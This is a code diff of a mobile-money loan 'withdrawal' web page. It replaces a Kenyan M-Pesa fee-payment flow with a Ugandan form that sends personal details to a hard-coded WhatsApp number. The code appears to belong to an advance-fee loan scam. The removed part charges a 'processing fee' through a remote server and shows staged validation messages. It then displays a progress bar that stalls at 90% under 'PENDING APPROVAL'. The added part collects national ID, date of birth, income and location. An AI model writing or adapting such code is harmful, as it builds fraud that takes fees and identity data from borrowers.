-                                <input type="text" id="idNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" placeholder="Enter ID number">
-                                <div class="error-message hidden" id="idNumberError"></div>
-                            </div>
-                        </div>`;
-                    break;
+            if (!loanData) {
+                document.getElementById('mainContent').style.display = 'none';
+                document.getElementById('noDataMessage').style.display = 'block';
+                return;
             }
 
-            title.textContent = titleText;
-            formContainer.innerHTML = formHTML;
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
-        }
+            document.getElementById('displayLoanAmount').textContent = formatNumber(loanData.amount || 0);
+            document.getElementById('displayInterestRate').textContent = (loanData.interestRate || '18') + '%';
+            document.getElementById('displayProcessingFee').textContent = 'UGX ' + formatNumber(loanData.processingFee || 0);
+            document.getElementById('displayRepaymentPeriod').textContent = (loanData.term || '30') + ' Days';
+            
+            const dueDate = new Date();
+            dueDate.setDate(dueDate.getDate() + parseInt(loanData.term || 30));
+            document.getElementById('displayDueDate').textContent = dueDate.toLocaleDateString('en-UG', { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric' 
+            });
 
-        function closeDetailsModal() {
-            document.getElementById('withdrawalDetailsModal').classList.add('hidden');
-            document.getElementById('withdrawalDetailsModal').classList.remove('flex');
+            const totalRepayment = loanData.totalRepayment || (loanData.amount * 1.18);
+            document.getElementById('displayTotalRepayment').textContent = 'UGX ' + formatNumber(totalRepayment);
+
+            const interestAmount = (loanData.amount || 0) * 0.18;
+            const amountReceive = (loanData.amount || 0) - (loanData.processingFee || 0);
+            
+            document.getElementById('summaryLoanAmount').textContent = 'UGX ' + formatNumber(loanData.amount || 0);
+            document.getElementById('summaryFee').textContent = 'UGX ' + formatNumber(loanData.processingFee || 0);
+            document.getElementById('summaryInterest').textContent = 'UGX ' + formatNumber(interestAmount);
+            document.getElementById('summaryReceive').textContent = 'UGX ' + formatNumber(amountReceive);
+            document.getElementById('summaryRepay').textContent = 'UGX ' + formatNumber(totalRepayment);
+
+            if (userData.firstName) document.getElementById('firstName').value = userData.firstName;
+            if (userData.lastName) document.getElementById('lastName').value = userData.lastName;
+            if (userData.phone) {
+                let phone = userData.phone.replace(/^\+?256/, '').replace(/\s/g, '');
+                document.getElementById('phoneNumber').value = phone;
+            }
+            if (userData.nationalId) document.getElementById('nationalId').value = userData.nationalId;
+            if (userData.district) document.getElementById('district').value = userData.district;
+
+            const form = document.getElementById('withdrawalForm');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                if (!validateForm()) {
+                    return;
+                }
+
+                const formData = {
+                    firstName: document.getElementById('firstName').value.trim(),
+                    lastName: document.getElementById('lastName').value.trim(),
+                    nationalId: document.getElementById('nationalId').value.trim(),
+                    dateOfBirth: document.getElementById('dateOfBirth').value,
+                    gender: document.getElementById('gender').value,
+                    phoneNumber: '+256' + document.getElementById('phoneNumber').value.trim(),
+                    mobileNetwork: document.getElementById('mobileNetwork').value,
+                    district: document.getElementById('district').value.trim(),
+                    village: document.getElementById('village').value.trim(),
+                    occupation: document.getElementById('occupation').value,
+                    monthlyIncome: document.getElementById('monthlyIncome').value
+                };
+
+                const fullName = formData.firstName + ' ' + formData.lastName;
+                const loanAmount = formatNumber(loanData.amount || 0);
+                const totalRepay = formatNumber(totalRepayment);
+                const repaymentPeriod = (loanData.term || '30') + ' Days';
+
+                const whatsappMessage = `Hello, my name is ${fullName}.
+
+*LOAN WITHDRAWAL REQUEST*
+
+*Personal Details:*
+- Full Name: ${fullName}
+- National ID: ${formData.nationalId}
+- Date of Birth: ${formData.dateOfBirth}
+- Gender: ${formData.gender}
+- Phone Number: ${formData.phoneNumber}
+- Mobile Network: ${formData.mobileNetwork}
+- District: ${formData.district}
+- Village/Town: ${formData.village}
+- Occupation: ${formData.occupation}
+- Monthly Income: ${formData.monthlyIncome}
+
+*Loan Details:*
+- Loan Amount: UGX ${loanAmount}
+- Repayment Period: ${repaymentPeriod}
+- Total to Repay: UGX ${totalRepay}
+
+I am qualified for a Loan of UGX ${loanAmount} and I am requesting a withdrawal to my ${formData.mobileNetwork} number ${formData.phoneNumber}.
+
+Please process my loan request. Thank you.`;
+
+                const whatsappNumber = '256778931247';
+                const encodedMessage = encodeURIComponent(whatsappMessage);
+                const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
+
+                document.getElementById('loadingOverlay').classList.add('active');
+                
+                setTimeout(function() {
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    window.open(whatsappUrl, '_blank');
+                }, 1500);
+            });
+
+            const phoneInput = document.getElementById('phoneNumber');
+            phoneInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '').substring(0, 9);
+            });
+
+            const nationalIdInput = document.getElementById('nationalId');
+            nationalIdInput.addEventListener('input', function(e) {
+                this.value = this.value.toUpperCase();
+            });
+        });
+
+        function formatNumber(num) {
+            return Math.round(num).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
         }
 
         function validateForm() {
             let isValid = true;
-            document.querySelectorAll('.form-field').forEach(field => {
-                field.classList.remove('error', 'success');
-            });
-            document.querySelectorAll('.error-message').forEach(msg => {
-                msg.classList.add('hidden');
-                msg.textContent = '';
+            const fields = [
+                { id: 'firstName', errorId: 'firstNameError', validate: (v) => v.trim().length >= 2 },
+                { id: 'lastName', errorId: 'lastNameError', validate: (v) => v.trim().length >= 2 },
+                { id: 'nationalId', errorId: 'nationalIdError', validate: (v) => v.trim().length >= 8 },
+                { id: 'dateOfBirth', errorId: 'dateOfBirthError', validate: (v) => v !== '' },
+                { id: 'gender', errorId: 'genderError', validate: (v) => v !== '' },
+                { id: 'phoneNumber', errorId: 'phoneNumberError', validate: (v) => /^[0-9]{9}$/.test(v.trim()) },
+                { id: 'mobileNetwork', errorId: 'mobileNetworkError', validate: (v) => v !== '' },
+                { id: 'district', errorId: 'districtError', validate: (v) => v.trim().length >= 2 },
+                { id: 'village', errorId: 'villageError', validate: (v) => v.trim().length >= 2 },
+                { id: 'occupation', errorId: 'occupationError', validate: (v) => v !== '' },
+                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: (v) => v !== '' }
+            ];
+
+            fields.forEach(field => {
+                const input = document.getElementById(field.id);
+                const error = document.getElementById(field.errorId);
+                
+                if (!field.validate(input.value)) {
+                    input.classList.add('error');
+                    input.classList.remove('valid');
+                    error.classList.add('show');
+                    isValid = false;
+                } else {
+                    input.classList.remove('error');
+                    input.classList.add('valid');
+                    error.classList.remove('show');
+                }
             });
 
-            switch(selectedWithdrawalMethod) {
-                case 'mpesa':
-                    const mpesaPhone = document.getElementById('mpesaPhone');
-                    const mpesaName = document.getElementById('mpesaName');
-                    if (!mpesaPhone.value.trim()) {
-                        showFieldError('mpesaPhone', 'mpesaPhoneError', 'Phone number is required');
-                        isValid = false;
-                    } else if (!/^254[0-9]{9}$/.test(mpesaPhone.value.trim())) {
-                        showFieldError('mpesaPhone', 'mpesaPhoneError', 'Enter valid phone (254XXXXXXXXX)');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('mpesaPhone');
-                    }
-                    if (!mpesaName.value.trim()) {
-                        showFieldError('mpesaName', 'mpesaNameError', 'Name is required');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('mpesaName');
-                    }
-                    break;
-                case 'airtel':
-                    const airtelPhone = document.getElementById('airtelPhone');
-                    const airtelName = document.getElementById('airtelName');
-                    if (!airtelPhone.value.trim()) {
-                        showFieldError('airtelPhone', 'airtelPhoneError', 'Phone number is required');
-                        isValid = false;
-                    } else if (!/^254[0-9]{9}$/.test(airtelPhone.value.trim())) {
-                        showFieldError('airtelPhone', 'airtelPhoneError', 'Enter valid phone (254XXXXXXXXX)');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('airtelPhone');
-                    }
-                    if (!airtelName.value.trim()) {
-                        showFieldError('airtelName', 'airtelNameError', 'Name is required');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('airtelName');
-                    }
-                    break;
-                case 'bank':
-                    const bankName = document.getElementById('bankName');
-                    const accountNumber = document.getElementById('accountNumber');
-                    const accountName = document.getElementById('accountName');
-                    const idNumber = document.getElementById('idNumber');
-                    if (!bankName.value) {
-                        showFieldError('bankName', 'bankNameError', 'Please select a bank');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('bankName');
-                    }
-                    if (!accountNumber.value.trim()) {
-                        showFieldError('accountNumber', 'accountNumberError', 'Account number is required');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('accountNumber');
-                    }
-                    if (!accountName.value.trim()) {
-                        showFieldError('accountName', 'accountNameError', 'Account holder name is required');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('accountName');
-                    }
-                    if (!idNumber.value.trim() || !/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
-                        showFieldError('idNumber', 'idNumberError', 'Enter valid ID (7-8 digits)');
-                        isValid = false;
-                    } else {
-                        showFieldSuccess('idNumber');
-                    }
-                    break;
+            const termsCheckbox = document.getElementById('termsCheckbox');
+            if (!termsCheckbox.checked) {
+                alert('Please agree to the Terms and Conditions to proceed.');
+                isValid = false;
             }
+
+            if (!isValid) {
+                const firstError = document.querySelector('.error-message.show');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }
+
             return isValid;
         }
-
-        function showFieldError(fieldId, errorId, message) {
-            const field = document.getElementById(fieldId);
-            const error = document.getElementById(errorId);
-            field.classList.add('error');
-            error.textContent = message;
-            error.classList.remove('hidden');
-        }
-
-        function showFieldSuccess(fieldId) {
-            document.getElementById(fieldId).classList.add('success');
-        }
-
-        async function processWithdrawal() {
-            if (isProcessing) return;
-            if (!validateForm()) return;
-
-            isProcessing = true;
-            closeDetailsModal();
-            showEnhancedProcessingOverlay();
-
-            try {
-                const feeAmount = parseFloat(loanData.fee);
-                let withdrawalData = { method: selectedWithdrawalMethod, loanId: loanData.tracking };
-                let paymentPhone = loanData.phone;
-
-                switch(selectedWithdrawalMethod) {
-                    case 'mpesa':
-                        paymentPhone = document.getElementById('mpesaPhone').value;
-                        withdrawalData.phone = paymentPhone;
-                        withdrawalData.name = document.getElementById('mpesaName').value;
-                        break;
-                    case 'airtel':
-                        paymentPhone = document.getElementById('airtelPhone').value;
-                        withdrawalData.phone = paymentPhone;
-                        withdrawalData.name = document.getElementById('airtelName').value;
-                        break;
-                    case 'bank':
-                        withdrawalData.bankName = document.getElementById('bankName').value;
-                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
-                        withdrawalData.accountName = document.getElementById('accountName').value;
-                        withdrawalData.idNumber = document.getElementById('idNumber').value;
-                        break;
-                }
-
-                console.log('Processing fee payment for withdrawal:', withdrawalData);
-                localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));
-
-                updateProcessingMessage('Validating details...');
-                await delay(1500);
-                updateProcessingMessage('Sending withdrawal request...');
-                await delay(1000);
-
-                // FIXED: Changed feeResponse to response
-                const response = await fetch('https://server-4d6l.onrender.com/pay', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phone: paymentPhone,
-                        amount: feeAmount
-                    })
-                });
-
-                // FIXED: Now using correct variable name 'response'
-                if (!response.ok) {
-                    throw new Error(`Server error: ${response.status}`);
-                }
-
-                // FIXED: Now using correct variable name 'response'
-                const result = await response.json();
-                console.log('Fee payment response:', result);
-
-                // Start receipt tracking if we got a reference
-                if (result.success && result.reference) {
-                    startReceiptTracking(result.reference);
-                }
-
-                updateProcessingMessage('Confirming payment...');
-                await delay(1500);
-
-                hideProcessingOverlay();
-                showFeePaymentSuccess(withdrawalData);
-
-            } catch (error) {
-                console.error('Fee payment error:', error);
-                hideProcessingOverlay();
-                showError('Fee payment failed: ' + error.message);
-            } finally {
-                isProcessing = false;
-            }
-        }
-
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        function showEnhancedProcessingOverlay() {
-            const overlay = document.getElementById('processingOverlay');
-            overlay.classList.remove('hidden');
-            overlay.classList.add('flex');
-        }
-
-        function updateProcessingMessage(message) {
-            document.getElementById('processingMessage').textContent = message;
-        }
-
-        function hideProcessingOverlay() {
-            const overlay = document.getElementById('processingOverlay');
-            overlay.classList.add('hidden');
-            overlay.classList.remove('flex');
-        }
-
-        function showFeePaymentSuccess(withdrawalData) {
-            const methodNames = { 'mpesa': 'M-Pesa', 'airtel': 'Airtel Money', 'bank': 'Bank Transfer' };
-            const methodIcons = { 'mpesa': 'fas fa-mobile-alt', 'airtel': 'fas fa-mobile-alt', 'bank': 'fas fa-university' };
-            const fee = document.getElementById("processingFee").textContent;
-            const amount = document.getElementById("withdrawalAmount").textContent;
-
-            const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">SWIFTWALLET DIGITAL VENTURES</span>. Enter your M-Pesa PIN to complete the fee payment of <span class="font-bold text-green-700">${fee}</span>. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment is confirmed.`;
-
-            document.getElementById('successMessage').innerHTML = message;
-            document.getElementById('successHeading').textContent = `Withdrawal of ${amount} Initiated Successfully!`;
-            document.getElementById('progressText').textContent = 'Pending Fee Payment & Approval...';
-
-            const methodLogo = document.getElementById('selectedMethodLogo');
-            const methodName = document.getElementById('selectedMethodName');
-            methodLogo.innerHTML = `<i class="${methodIcons[selectedWithdrawalMethod]} text-white text-xl"></i>`;
-            methodName.textContent = methodNames[selectedWithdrawalMethod];
-
-            document.getElementById('successAlert').classList.remove('hidden');
-            document.getElementById('successAlert').scrollIntoView({ behavior: 'smooth', block: 'start' });
-
-            localStorage.setItem('swift_fee_payment_initiated', 'true');
-            localStorage.setItem('swift_withdrawal_method', selectedWithdrawalMethod);
-            localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
-
-            startPendingProgress();
-        }
-
-        function startPendingProgress() {
-            let progress = 0;
-            const progressBar = document.getElementById('progressBar');
-            const progressText = document.getElementById('progressText');
-
-            progressBar.style.width = "0%";
-            progressText.textContent = "Pending Fee Payment... 0%";
-
-            const interval = setInterval(() => {
-                if (progress >= 90) {
-                    clearInterval(interval);
-                    progressText.textContent = "Pending Fee Payment & Withdrawal Approval...";
-                } else {
-                    progress += 5;
-                    progressBar.style.width = progress + "%";
-                    progressText.textContent = "Pending Fee Payment... " + progress + "%";
-                }
-            }, 1000);
-        }
-
-        // Receipt tracking functions
-        function renderReceiptCard(receipt) {
-            const container = document.getElementById('receiptCardContainer');
-            if (!container) return;
-
-            const status = (receipt.status || '').toLowerCase();
-            let statusPillClass = 'bg-gray-100 text-gray-700';
-            let statusLabel = status.toUpperCase();
-
-            if (status === 'success') {
-                statusPillClass = 'bg-green-100 text-green-700';
-                statusLabel = 'SUCCESS';
-            } else if (status === 'pending') {
-                statusPillClass = 'bg-yellow-100 text-yellow-700';
-                statusLabel = 'PENDING';
-            } else if (['error','stk_failed','cancelled','failed'].includes(status)) {
-                statusPillClass = 'bg-red-100 text-red-700';
-                statusLabel = 'CANCELLED / FAILED';
-            }
-
-            container.innerHTML = `
-                <div class="bg-white border border-gray-200 rounded-2xl shadow-lg p-6 space-y-6">
-                    <div class="flex justify-between items-center border-b pb-4">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-10 h-10 bg-primary rounded-lg flex items-center justify-center">
-                                <i class="fas fa-bolt text-white text-lg"></i>
-                            </div>
-                            <div>
-                                <h2 class="text-lg font-bold text-gray-900">Swift Loan Wallet Receipt</h2>
-                                <p class="text-xs text-gray-500">Loan Withdrawal Receipt</p>
-                            </div>
-                        </div>
-                        <span class="px-3 py-1 text-sm font-semibold rounded-full ${statusPillClass}">${statusLabel}</span>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
-                        <div><p class="text-gray-500">Reference</p><p class="font-semibold text-gray-900">${receipt.reference}</p></div>
-                        <div><p class="text-gray-500">Transaction ID</p><p class="font-semibold text-gray-900">${receipt.transaction_id || 'N/A'}</p></div>
-                        <div><p class="text-gray-500">Transaction Code</p><p class="font-semibold text-gray-900">${receipt.transaction_code || 'N/A'}</p></div>
-                        <div><p class="text-gray-500">Phone</p><p class="font-semibold text-gray-900">${receipt.phone}</p></div>
-                        <div><p class="text-gray-500">Customer Name</p><p class="font-semibold text-gray-900">${receipt.customer_name}</p></div>
-                        <div><p class="text-gray-500">Fee Amount</p><p class="font-semibold text-orange-600">KES ${receipt.amount}</p></div>
-                        <div><p class="text-gray-500">Loan Amount</p><p class="font-bold text-green-700">${document.getElementById("availableBalance").textContent}</p></div>
-                        <div><p class="text-gray-500">Date & Time</p><p class="font-semibold text-gray-900">${new Date(receipt.timestamp).toLocaleString()}</p></div>
-                    </div>
-                    <div class="bg-gray-50 border border-gray-200 rounded-lg p-3 text-xs text-gray-600">
-                        <p><strong>Note:</strong> ${receipt.status_note || 'Processing your request...'}</p>
-                        <p class="mt-1 italic">This receipt is system-generated and valid without signature.</p>
-                    </div>
-                    <div class="flex justify-end space-x-3">
-                        <a href="https://server-4d6l.onrender.com/receipt/${receipt.reference}/pdf" target="_blank" class="px-5 py-2 bg-primary text-white rounded-lg shadow hover:bg-primary-dark transition flex items-center">
-                            <i class="fas fa-download mr-2"></i> Download PDF
-                        </a>
-                        <button onclick="window.print()" class="px-5 py-2 bg-white border border-gray-200 rounded-lg shadow hover:bg-gray-50 transition flex items-center">
-                            <i class="fas fa-print mr-2"></i> Print
-                        </button>
-                    </div>
-                </div>
-            `;
-        }
-
-        async function fetchReceipt(reference) {
-            try {
-                const resp = await fetch(`https://server-4d6l.onrender.com/receipt/${reference}`);
-                const data = await resp.json();
-                if (data.success) {
-                    renderReceiptCard(data.receipt);
-                    return data.receipt;
-                }
-            } catch (err) {
-                console.error("Fetch receipt error:", err);
-            }
-            return null;
-        }
-
-        function startReceiptTracking(reference) {
-            renderReceiptCard({
-                reference,
-                transaction_id: null,
-                transaction_code: null,
-                amount: loanData?.fee || "N/A",
-                loan_amount: loanData?.amount || "N/A",
-                phone: loanData?.phone || "N/A",
-                customer_name: localStorage.getItem('swift_customer_name') || "Swift Applicant",
-                status: "pending",
-                status_note: "Waiting for M-Pesa confirmation...",
-                timestamp: new Date().toISOString()
-            });
-
-            receiptPollInterval = setInterval(async () => {
-                const receipt = await fetchReceipt(reference);
-                if (receipt && receipt.status !== 'pending') {
-                    clearInterval(receiptPollInterval);
-                }
-            }, 5000);
-
-            fetchReceipt(reference);
-        }
-
-        function showError(message) {
-            const errorAlert = document.getElementById('errorAlert');
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.textContent = message;
-            errorAlert.classList.remove('hidden');
-            errorAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            errorAlert.classList.add('shake');
-            setTimeout(() => errorAlert.classList.remove('shake'), 500);
-        }
-
-        function hideError() {
-            document.getElementById('errorAlert').classList.add('hidden');
-        }
-
-        function openHelpModal() {
-            document.getElementById('helpModal').classList.remove('hidden');
-            document.getElementById('helpModal').classList.add('flex');
-        }
-
-        function closeHelpModal() {
-            document.getElementById('helpModal').classList.add('hidden');
-            document.getElementById('helpModal').classList.remove('flex');
-            document.getElementById('helpResult').innerHTML = "";
-        }
-
-        function checkMpesaCode() {
-            const code = document.getElementById('mpesaCodeInput').value.trim();
-            const resultBox = document.getElementById('helpResult');
-
-            if (!code) {
-                resultBox.innerHTML = `<p class="text-red-600">Please enter a valid code.</p>`;
-                return;
-            }
-
-            if (/^[A-Z0-9]{10,}$/i.test(code)) {
-                resultBox.innerHTML = `<p class="text-green-600 font-medium">Code ${code} looks valid. Checking validity...</p>`;
-            } else {
-                resultBox.innerHTML = `<p class="text-red-600">Invalid code format. Please try again.</p>`;
-            }
-        }
-
-        function goBack() {
-            window.history.back();
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOM Content Loaded');
-            loadLoanData();
-
-            const feePaymentInitiated = localStorage.getItem('swift_fee_payment_initiated');
-            if (feePaymentInitiated === 'true') {
-                const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
-                document.getElementById('successMessage').innerHTML = `Complete previous withdrawal by clicking withdraw button below. STK Push was sent from SWIFTWALLET DIGITAL VENTURES. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`;
-                document.getElementById('successAlert').classList.remove('hidden');
-            }
-        });
-
-        window.addEventListener('beforeunload', function(e) {
-            if (isProcessing) {
-                e.preventDefault();
-                e.returnValue = 'A withdrawal is currently being processed. Are you sure you want to leave?';
-                return e.returnValue;
-            }
-        });
     </script>
 </body>
 </html>
